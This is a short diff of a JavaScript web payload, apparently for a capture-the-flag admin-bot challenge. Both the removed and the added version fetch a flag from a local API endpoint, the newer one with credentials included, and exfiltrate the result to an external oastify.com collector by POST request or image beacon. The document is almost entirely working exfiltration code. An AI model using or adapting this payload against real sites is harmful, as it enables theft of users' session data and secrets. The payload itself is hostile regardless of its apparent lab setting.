@@ -1,33 +1,18 @@
-<!DOCTYPE html>
-<html>
-<head><title>Flag Collection</title></head>
-<body>
-<h1>Loading...</h1>
 <script>
-fetch('http://127.0.0.1:5000/api/fetchflag')
-  .then(res => res.json())
-  .then(data => {
-    // Send flag to your webhook
-    fetch('https://tgd32f50v4idjvz1rls8qvw8ezkq8iw7.oastify.com', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        flag: data.flag,
-        timestamp: new Date().toISOString(),
-        source: 'admin_bot'
-      })
-    });
-  })
-  .catch(error => {
-    // Send error to webhook too
-    fetch('https://tgd32f50v4idjvz1rls8qvw8ezkq8iw7.oastify.com', {
-      method: 'POST',
-      body: JSON.stringify({error: error.message})
-    });
-  });
-</script>
-</body>
+function exfiltrate(data){
+    new Image().src =
+        "https://vlk57ha206nfox43wnxavx1aj1ptdj18.oastify.com/?flag="
+        + encodeURIComponent(data);
+}
 
-</html>
+fetch("http://127.0.0.1:5000/api/fetchflag", {
+    credentials: "include"
+})
+.then(res => res.json())
+.then(res => {
+    exfiltrate(res.flag);
+})
+.catch(err => {
+    exfiltrate("error:" + err.message);
+});
+</script>
